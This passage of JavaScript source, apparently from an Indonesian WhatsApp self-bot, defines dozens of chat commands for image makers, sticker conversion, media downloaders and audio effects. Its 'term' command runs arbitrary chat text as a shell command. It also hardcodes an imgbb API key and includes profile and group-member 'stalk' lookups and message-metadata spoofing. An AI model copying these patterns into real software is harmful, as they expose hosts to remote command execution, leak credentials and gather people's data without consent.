                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Teks`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.url)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
case 'glow': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Teks`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.url)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'summer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Teks`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.url)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'flower': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Teks`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=flower&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.url)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'burn': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Teks`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.url)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'quote': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Teks`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.url)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'wooden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Teks`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.url)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
			case 'golden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Teks`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=${nikokontol}`)
					buffer1 = await getBuffer(anu.result.url)
					thunderx7.sendMessage(from, buffer1, image, {quoted: thunder, caption: `${makell}\n\nDone`})
					break
case 'gplaybutton':
                case 'splaybutton':
                    if (args.length == 0) return reply('Usage: ${prefix}${command}text\nExample: ${prefix}${command} iyah')
                    txt = args.join(" ")
                    reply(mess.wait)
                    buffer = await getBuffer('https://api.zeks.xyz/api/${command}?text=${txt}&apikey=${ZeksApi}')
                    thunderx7.sendMessage(from, buffer, image, {caption: 'Dah tu', quoted: thunder})
                    break
case  'pubg':
if (args.length == 0) return reply('teksnya mana?')
txt1 = args[0]
txt2 = args[1]
reply(mess.wait)
zn.pubg(txt1, txt2).then(res => {
sendMediaURL(from, `${res.url}`, 'Done✓')
})
break
case 'cemetery':
if (!q) return reply('teksnya mana?')
reply(mess.wait)
zn.cemetery(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Done✓')
})
break
case 'wolf':
if (!q) return reply('teksnya mana?')
reply(mess.wait)
zn.wolf(q).then(res => {
sendMediaURL(from, `${res.url}`, 'Done✓')
})
break
case 'cover':
if (!q) return reply('teksnya mana?')
reply(mess.wait)
zn.cover(q).then(res => {
sendMediaURL(from, `${res.url}`, 'Done✓')
})
break
case 'nightsky':
if (!q) return reply('teksnya mana?')
reply(mess.wait)
zn.nightsky(q).then(res => {
sendMediaURL(from, `${res.url}`, 'Done✓')
})
break
case 'woodblock':
if (!q) return reply('teksnya mana?')
reply(mess.wait)
zn.woodblock(q).then(res => {
sendMediaURL(from, `${res.url}`, 'Done✓')
})
break
case 'under':
if (!q) return reply('teksnya mana?')
reply(mess.wait)
zn.under(q).then(res => {
sendMediaURL(from, `${res.url}`, 'Done✓')
})
break
case 'size':
if (args.length < 1) return freply('Masukan angkanya')
filsize = args[0]
costick = await thunderx7.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:thunder})
thunderx7.relayWAMessage(costick)
break
    case 'gifstiker':
				case 's':
			case 'stickergif':  
				case 'sticker':
				  case 'stiker':
					if (isMedia && !thunder.message.videoMessage || isQuotedImage ) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
                    let media = await thunderx7.downloadAndSaveMediaMessage(encmedia, `./database/stik/${sender}`)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./database/stik/data.exif ./database/stik/${sender}.webp -o ./database/stik/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									thunderx7.sendMessage(from, fs.readFileSync(`./database/stik/${sender}.webp`), sticker, {quoted: thunder})
									
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./database/stik/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./database/stik/${sender}.webp`)
                } else if ((thunder.message.videoMessage || isQuotedVideo && thunder.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength)) {
                    let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
                    let media = await thunderx7.downloadAndSaveMediaMessage(encmedia, `./database/stik/${sender}`)
					
                        await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./database/stik/data.exif ./database/stik/${sender}.webp -o ./database/stik/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									thunderx7.sendMessage(from, fs.readFileSync(`./database/stik/${sender}.webp`), sticker, {quoted:thunder})
									
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./database/stik/${sender}.webp`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./database/stik/${sender}.webp`)
                } else {
                    reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                }
            
            
                break
case 'clear':
if(!isOwner && !thunder.key.fromMe) return reply("lu siapa")
thunderx7.sendMessage(from, `${bersihin}`, text, {quoted: thunder})
break
case 'stickmeme':
if(!q) return reply(`Example :Reply sticker dengan Caption  ${prefix + command} thunderx7` )
if (thunder.message.extendedTextMessage != undefined || thunder.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait)
owgi = await thunderx7.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", './stickmeme.jpeg')
teks = `${anu.display_url}`
sendStickerUrl(from, `https://pecundang.herokuapp.com/api/stickermeme?url=${teks}&teks=${q}`, thunder)
fs.unlinkSync('./stickmeme.jpeg')
}
break
case 'stickmeme2':
if(!q) return reply(`Example : Reply sticker dengan Caption ${prefix + command} thunder`)
if (thunder.message.extendedTextMessage != undefined || thunder.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait)
owgi = await thunderx7.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", './stickmeme.jpeg')
teks = `${anu.display_url}`
sendStickerUrl(from, `https://pecundang.herokuapp.com/api/memegen3?teks=${q}&img_url=${teks}`, thunder)
fs.unlinkSync('./stickmeme.jpeg')
}
break
case 'stickmeme3':
if (!isQuotedSticker) return reply(`Format salah! Reply sticker\nContoh ${prefix + command} text|text`)
var tex1 = body.slice(12).split('|')[0]
var tex2 = body.slice(12).split('|')[1]
if (!tex2) return reply(`Format salah! Reply sticker\nContoh ${prefix + command} text|text`)
if (thunder.message.extendedTextMessage != undefined || thunder.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait)
owgi = await thunderx7.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", './stickmeme.jpeg')
teks = `${anu.display_url}`
sendStickerUrl(from, `https://pecundang.herokuapp.com/api/memegen2?teks1=${tex1}&teks2=${tex2}&img_url=${teks}`, thunder)
fs.unlinkSync('./stickmeme.jpeg')
}
break
    case 'toimg':
			if (!isQuotedSticker) return reply('Tag sticker')
			reply('Lagi proses')
			encmedia = JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await thunderx7.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Biasakan make mata buat baca')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	case 'ytsearch':
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await thunderx7.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	case 'setreply':
	case 'setfake':
            if (!thunder.key.fromMe && !isOwner) return reply(mess.owner)
			if (!q) return reply(mess.wrongFormat)
			fake = q
			reply(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
    if (!thunder.key.fromMe && !isOwner) return reply(mess.owner)
        	if ((isMedia && !thunder.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo : thunder
			delb = await thunderx7.downloadMediaMessage(boij)
			fs.writeFileSync(`./database/stik/fake.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'setthumb':
    if (!thunder.key.fromMe && !isOwner) return reply(mess.owner)
	        if ((isMedia && !thunder.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo : thunder
			delb = await thunderx7.downloadMediaMessage(boij)
			fs.writeFileSync(`./database/stik/thumb.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'ytmp4':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
			let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks2) return reply(mess.error.Iv)
				try {
				reply('Lagi proses')
				ytv(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
				if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam thundertuk link_`)
				const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captionsYtmp4)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})		
				})
				} catch (err) {
			    reply(mess.error.api)
				}
				break
	case 'emoji':
			if (!q) return reply('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
	case 'ytmp3':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
				try {
				reply('Lagi proses')
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam thundertuk link_`)
				const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break
 	case 'tiktok':
 case 'tiktokmp4':
 case 'ttnowm':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return reply('Linknya?')
 		reply('wait aaaa')
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
		thunderx7.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted:thunder,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
    case 'tiktokaudio':
    case 'tiktokmp3':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return reply('Linknya?')
 		reply('wait aaaa')
 		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { audio} = result
            sendMediaURL(from,audio,'')
    		})
     		.catch(e => console.log(e))
     		break
    case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			thunderx7.sendMessage(from, teks, text,{quoted:thunder,detectLinks: false})                        
            })              
			break
case 'modecittugas':
			if (args.length < 1) return reply('Pertanyaan apa ?????')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '變______________變'
			for (let Y of res.data) {
			teks += `\n*「 TUKANG CIT V1 」*\n\n*𖣂 Jawaban:* ${Y.jawaban[0].text}\n變______________變'\n`
			}
			thunderx7.sendMessage(from, teks, text,{quoted:fvn,detectLinks: false})      
thunderx7.sendMessage(from, 'Dah tuh:V\nBy Thunder | ig:@thunderx.7', text, {quote: fvn})                  
            })              
			break
    case 'igdl':
    case 'ig':
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!isUrl(args[0]) && !args[0].includes('/?utm_medium=copy_link')) return reply('Hapus teks /?utm_medium=copy_link')
        if (!q) return reply('Linknya?')
        reply('Lagi proses')
	    hx.igdl(args[0])
	    .then(async(result) => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    thunderx7.sendMessage(from,link,video,{quoted: thunder,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    thunderx7.sendMessage(from,link,image,{quoted: thunder,caption: `Type : ${i.type}`})                  
                }
            }
            });
	    break
    case 'igstalk':
            if (!q) return reply('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Following* : ${Y.followers}\n*Followers* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break   
            case 'githubstalk':
				reply('Sabar...')
				get_result = await fetchJson(`https://janbot-api.herokuapp.com/api/stalk/github?username=${body.slice(13)}`)
				get_result = get_result.result
				get_result1 = `Name : ${get_result.name}\n
Post : ${get_result.public_repos}\n
Followers : ${get_result.followers}\n
Following : ${get_result.following}\n
Bio : ${get_result.bio}\n
Location : ${get_result.location}\n
Link : ${get_result.html_url}\n`
				buff = await getBuffer(get_result.avatar_url)
				thunderx7.sendMessage(from, buff, image, {quoted: thunder, caption: get_result1})
				break
    case 'fb':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply('Lagi proses')
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*Link video_normal* : ${G.Normal_video}`)
            })
            break    
	case 'term':
    if (!thunder.key.fromMe && !isOwner) return reply(mess.owner)
			if (!q) return reply(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return reply(`SELF-BOT:~ ${err}`)
			if (stdout) {
			reply(stdout)
			}
			})
		    break 
    case 'join':
    if (!thunder.key.fromMe && !isOwner) return reply(mess.owner)
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return fakestatus('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
            var response = await thunderx7.acceptInvite(codeInvite)
            fakestatus('SUKSES')
            } catch {
            reply('LINK ERROR!')
            }
            break
    case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return reply('Linknya?')
            ten = args[0]
            var res = await hx.twitter(`${ten}`)
            ren = `${g.HD}`
            sendMediaURL(from,ren,'DONE')
            break
    case 'runtime':
    case 'test':
            run = process.uptime() 
            teks = `${kyun(run)}`
            reply(`${teks}`)
            break  
	case 'speed':
	case 'ping':
			const timestamp = speed();
			const latensi = speed() - timestamp
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}𝐒𝐩𝐞𝐞𝐝: ${latensi.toFixed(4)} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬*`
			reply(`${pingnya}`)
			})
			break  
    case 'totag':
    if (!thunder.key.fromMe && !isOwner) return reply(mess.owner)
            if ((isMedia && !thunder.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            file = await thunderx7.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await thunderx7.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: thunder
            }
            ini_buffer = fs.readFileSync(file)
            thunderx7.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !thunder.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            file = await thunderx7.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await thunderx7.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: thunder
            }
            ini_buffer = fs.readFileSync(file)
            thunderx7.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !thunder.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            file = await thunderx7.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await thunderx7.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: thunder
            }
            ini_buffer = fs.readFileSync(file)
            thunderx7.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !thunder.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            file = await thunderx7.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await thunderx7.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: thunder
            }
            ini_buffer = fs.readFileSync(file)
            thunderx7.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
        case 'tesvn':
        thunderx7.updatePresence(from, Presence.composing)
thunderx7.sendMessage(from, `yayaya`, text, {quote: ftroli})
break
    case 'tomp4':
            if ((isMedia && !thunder.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            owgi = await thunderx7.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break
    case 'tourl':
            if ((isMedia && !thunder.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo : thunder
            owgi = await thunderx7.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break	
           //
    case 'inspect':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await thunderx7.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desk* : ga ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Deskripsi diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Iya' : 'Bukan'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             thunderx7.sendMessage(from,par,text,{quoted:thunder,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
					//=====================================AUDIO=====================================\\
					case 'slowmo':
				//if (!isPublic) return reply(mess.only.publikG)
		////if (!isRegistered) return reply( ind.noregis())

				encmedia = JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				mediathunder = await thunderx7. downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${mediathunder} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(mediathunder)
				if (err) return reply('Error!')
				uhh = fs.readFileSync(ran)
				thunderx7. sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fvn})
				fs.unlinkSync(ran)
				})
				break

				case 'tupai':
				//if (!isPublic) return reply(mess.only.publikG)
		////if (!isRegistered) return reply( ind.noregis())

					encmedia = JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediathunder = await thunderx7. downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediathunder} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediathunder)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						thunderx7. sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fvn})
						fs.unlinkSync(ran)
					})
				break
				case 'gemok':
				//if (!isPublic) return reply(mess.only.publikG)
		////if (!isRegistered) return reply( ind.noregis())

					encmedia = JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediathunder = await thunderx7. downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediathunder} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediathunder)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						thunderx7. sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fvn})
						fs.unlinkSync(ran)
					})
				break
				case 'bass':                 
				//if (!isPublic) return reply(mess.only.publikG)
		////if (!isRegistered) return reply( ind.noregis())
					encmedia = JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo
